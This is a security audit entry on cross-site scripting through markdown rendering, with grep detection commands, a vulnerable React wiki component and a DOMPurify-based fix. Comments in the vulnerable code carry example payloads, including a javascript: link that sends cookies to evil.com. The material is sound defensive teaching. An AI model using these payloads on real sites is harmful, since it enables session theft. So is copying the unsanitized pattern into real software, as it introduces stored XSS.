# OC-085: XSS via Markdown Rendering

**Category:** Web Application Security
**Severity:** MEDIUM
**Auditors:** WEB-01
**CWE:** CWE-79
**OWASP:** A03:2021 - Injection

## Description

Markdown rendering libraries convert user-authored markdown to HTML, which is then injected into the DOM. Many markdown parsers allow raw HTML passthrough by default, meaning an attacker can embed `<script>` tags, `<img onerror>` handlers, or `javascript:` protocol links directly in markdown content. Even libraries that restrict raw HTML can be bypassed through link `href` attributes with `javascript:` URLs or through XSS payloads in image alt text or title attributes.

This is a common vulnerability in wikis, documentation platforms, chat applications, issue trackers, and any tool that renders user-supplied markdown. Libraries like `marked`, `markdown-it`, and `showdown` have all had configurations where HTML passthrough or `javascript:` URLs were permitted by default.

The attack surface is broader than raw HTML injection alone. Markdown supports link references `[text](url)`, image references `![alt](url)`, and autolinks, all of which can carry `javascript:` or `data:` protocol payloads if the renderer does not sanitize URL schemes.

## Detection

```
# Markdown rendering libraries in use
grep -rn "import.*marked\|require.*marked\|import.*markdown-it\|import.*showdown\|import.*remark" --include="*.ts" --include="*.js"

# Markdown output injected via dangerouslySetInnerHTML
grep -rn "dangerouslySetInnerHTML.*marked\|dangerouslySetInnerHTML.*markdown\|dangerouslySetInnerHTML.*render" --include="*.tsx" --include="*.jsx"

# Check marked configuration for sanitize option
grep -rn "marked\.\(parse\|setOptions\)" --include="*.ts" --include="*.js"

# Check if HTML is allowed in markdown config
grep -rn "html:\s*true" --include="*.ts" --include="*.js"
```

## Vulnerable Code

```typescript
import { marked } from 'marked';
import React from 'react';

interface WikiPage {
  content: string; // User-authored markdown
}

function WikiPageView({ page }: { page: WikiPage }) {
  // VULNERABLE: marked() with default options allows raw HTML and javascript: URLs
  const html = marked(page.content);

  // Attacker's markdown:
  // [Click me](javascript:document.location='https://evil.com/?c='+document.cookie)
  // Or: <img src=x onerror="alert(document.cookie)">

  return (
    <div
      className="wiki-content"
      dangerouslySetInnerHTML={{ __html: html }}
    />
  );
}
```

## Secure Code

```typescript
import { marked } from 'marked';
import DOMPurify from 'dompurify';
import React from 'react';

interface WikiPage {
  content: string;
}

function WikiPageView({ page }: { page: WikiPage }) {
  // Step 1: Parse markdown to HTML
  const rawHtml = marked(page.content);

  // Step 2: Sanitize the HTML output, stripping scripts and dangerous protocols
  const cleanHtml = DOMPurify.sanitize(rawHtml, {
    ALLOWED_TAGS: [
      'h1', 'h2', 'h3', 'h4', 'h5', 'h6', 'p', 'br', 'hr',
      'strong', 'em', 'del', 'a', 'ul', 'ol', 'li',
      'blockquote', 'code', 'pre', 'table', 'thead', 'tbody',
      'tr', 'th', 'td', 'img',
    ],
    ALLOWED_ATTR: ['href', 'src', 'alt', 'title', 'class'],
    ALLOWED_URI_REGEXP: /^(?:https?|mailto):/i, // Block javascript: and data: URLs
  });

  return (
    <div
      className="wiki-content"
      dangerouslySetInnerHTML={{ __html: cleanHtml }}
    />
  );
}
```

## Impact

Attackers can inject JavaScript through markdown content that is rendered to other users. In collaboration tools and wikis, this enables account takeover across the entire user base. The `javascript:` URL vector is especially insidious because it creates clickable links that appear legitimate.

## References

- CWE-79: Improper Neutralization of Input During Web Page Generation
- marked.js security: https://marked.js.org/#/USING_ADVANCED.md#options (sanitize option deprecated)
- OWASP: Testing for Stored XSS via markdown (WSTG-INPV-02)
- CVE-2022-21680: Regular Expression Denial of Service in marked
